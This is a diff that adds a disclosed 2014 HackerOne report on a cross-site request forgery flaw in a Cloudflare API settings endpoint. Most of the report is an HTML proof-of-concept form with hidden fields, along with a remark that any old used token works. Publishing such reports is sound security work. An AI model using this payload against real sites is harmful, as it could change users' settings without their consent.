@@ -1,0 +1,24 @@
+ReportLink:https://hackerone.com/reports/8943
+WeaknessName:Cross-Site Request Forgery (CSRF)
+Reporter:https://hackerone.com/chandrakant
+ReportedTo:Cloudflare(cloudflare)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:10.09.2014 10:09:43
+
+Summary:
+
+<html>
+  <!-- CSRF PoC By CK-->
+  <body>
+    <form action="https://www.cloudflare.com/api/v2/comm/set">
+      <input type="hidden" name="k" value="comm&#95;ea" />
+      <input type="hidden" name="v" value="1" />
+      <input type="hidden" name="atok" value="1398171312&#45;878f7ba09e5dac2e4e23" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+The atok token can be any oold used token it works very well .
